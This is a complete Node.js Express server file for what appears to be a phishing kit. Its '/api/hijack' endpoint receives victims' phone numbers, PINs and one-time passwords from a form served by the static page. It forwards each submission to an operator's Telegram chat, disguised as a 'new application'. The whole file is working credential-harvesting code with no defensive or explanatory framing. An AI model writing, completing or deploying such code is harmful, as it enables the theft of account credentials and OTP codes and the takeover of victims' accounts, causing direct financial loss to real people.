const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// Serve static files (your HTML)
app.use(express.static('public'));

// Telegram config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// API endpoint for your form
app.post('/api/hijack', async (req, res) => {
    try {
        const data = req.body;
        
        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `📱 NEW APPLICATION\nPhone: ${data.phone}\nPIN: ${data.pin}\nOTP: ${data.otp}`,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
